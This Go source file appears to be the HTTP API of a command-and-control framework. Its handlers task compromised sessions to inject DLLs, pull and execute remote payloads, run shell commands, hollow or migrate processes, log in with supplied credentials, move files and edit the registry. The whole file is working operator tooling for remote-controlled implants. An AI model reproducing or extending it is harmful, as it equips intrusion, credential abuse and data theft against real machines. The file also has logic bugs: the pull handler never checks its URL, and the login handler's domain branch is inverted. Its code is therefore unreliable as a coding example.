package cirrus

import (
	"context"
	"net/http"

	"github.com/PurpleSec/routex"
	"github.com/iDigitalFlame/xmt/c2/task"
)

func (s *sessionManager) httpTaskDLL(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskDLL) {
	if len(t.Data) == 0 && len(t.Path) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "data" or "path" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	if len(t.Path) > 0 {
		s.watchJob(x, j, "dll "+t.Path)
	} else {
		s.watchJob(x, j, "dll <raw>")
	}
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskPexec(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskPull) {
	if len(t.URL) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "url" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Task(task.PullExecuteAgent(t.URL, t.Agent, t.Detach != boolTrue, t.Filter))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "pexec "+t.URL)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskSpawn(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskSpawn) {
	if len(t.Name) == 0 || !isValidName(t.Name) {
		writeError(http.StatusBadRequest, `invalid or empty "name" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	p, _ := s.profile(t.Profile)
	if len(p) == 0 && len(t.Profile) > 0 {
		writeError(http.StatusNotFound, msgNoProfile, w, r)
		return
	}
	n, err := t.Packet(p)
	if err != nil {
		writeError(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "spawn "+t.Method+" @"+t.Name)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskZombie(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskZombie) {
	if len(t.Data) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "data" value`, w, r)
		return
	}
	if len(t.Fake) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "fake" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "zombie "+t.Fake)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskSystem(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskSystem) {
	if len(t.Command) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "command" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.syscall(t.Command, t.Args, t.Filter)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	if j == nil {
		w.WriteHeader(http.StatusOK)
		return
	}
	if len(t.Args) > 0 {
		s.watchJob(x, j, "system "+t.Command+" "+t.Args)
	} else {
		s.watchJob(x, j, "system "+t.Command)
	}
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskCommand(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskCommand) {
	if len(t.Command) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "command" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "execute "+t.Command)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskPull(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	var (
		u = c.StringDefault("url", "")
		p = c.StringDefault("path", "")
		a = c.StringDefault("agent", "")
	)
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "url" value`, w, r)
		return
	}
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "path" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Task(task.PullAgent(u, a, p))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "pull "+u+" "+p)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskMigrate(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskMigrate) {
	if len(t.Name) == 0 || !isValidName(t.Name) {
		writeError(http.StatusBadRequest, `invalid or empty "name" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	p, _ := s.profile(t.Profile)
	if len(p) == 0 && len(t.Profile) > 0 {
		writeError(http.StatusNotFound, msgNoProfile, w, r)
		return
	}
	n, err := t.Packet(p)
	if err != nil {
		writeError(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "migrate "+t.Method+" @"+t.Name)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskLogin(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	u := c.StringDefault("user", "")
	if len(u) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "user" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	var (
		p      = c.StringDefault("pass", "")
		d      = c.StringDefault("domain", "")
		j, err = x.s.Task(task.LoginUser(u, d, p))
	)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	if len(d) > 0 {
		s.watchJob(x, j, "login_user "+u)
	} else {
		s.watchJob(x, j, "login_user "+u+"@"+d)
	}
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskAssembly(_ context.Context, w http.ResponseWriter, r *routex.Request, t taskAssembly) {
	if len(t.Data) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "data" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Tasklet(t)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "asm")
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskUpload(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	p := c.StringDefault("path", "")
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "path" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	b, err := readEmptyB64(c.StringDefault("data", ""))
	if err != nil {
		writeError(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	j, err := x.s.Task(task.Upload(p, b))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "upload "+p)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskScript(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	q, n := s.script(c.StringDefault("script", ""))
	if q == nil {
		writeError(http.StatusNotFound, msgNoScript, w, r)
		return
	}
	j, err := x.s.Tasklet(q.s)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "script "+n)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskProfile(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	p, _ := s.profile(c.StringDefault("profile", ""))
	if len(p) == 0 {
		writeError(http.StatusNotFound, msgNoProfile, w, r)
		return
	}
	j, err := x.s.SetProfileBytes(p)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "profile "+p.String())
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskDownload(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	p := c.StringDefault("path", "")
	if len(p) == 0 {
		writeError(http.StatusBadRequest, `invalid or empty "path" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	j, err := x.s.Task(task.Download(p))
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "download "+p)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskRegistry(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	var (
		k = c.StringDefault("key", "")
		v = c.StringDefault("value", "")
		a = c.StringDefault("action", "")
	)
	if len(k) == 0 || len(a) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "key" and "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n, err := registryPacket(c, a, k, v)
	if err != nil {
		writeError(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, "regedit "+a+" "+k+":"+v)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskSystemIo(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	a := c.StringDefault("action", "")
	if len(a) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n, m, err := ioPacket(c, a)
	if err != nil {
		writeError(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, m)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
func (s *sessionManager) httpTaskWindowUI(_ context.Context, w http.ResponseWriter, r *routex.Request, c routex.Content) {
	a := c.StringDefault("action", "")
	if len(a) == 0 {
		writeError(http.StatusBadRequest, `specify a non-empty "action" value`, w, r)
		return
	}
	x := s.session(r.Values.StringDefault("session", ""))
	if x == nil {
		writeError(http.StatusNotFound, msgNoSession, w, r)
		return
	}
	n, m, err := uiPacket(c, a)
	if err != nil {
		writeError(http.StatusBadRequest, err.Error(), w, r)
		return
	}
	j, err := x.s.Task(n)
	if err != nil {
		writeError(http.StatusInternalServerError, "tasking failed: "+err.Error(), w, r)
		return
	}
	s.watchJob(x, j, m)
	w.WriteHeader(http.StatusCreated)
	j.JSON(w)
}
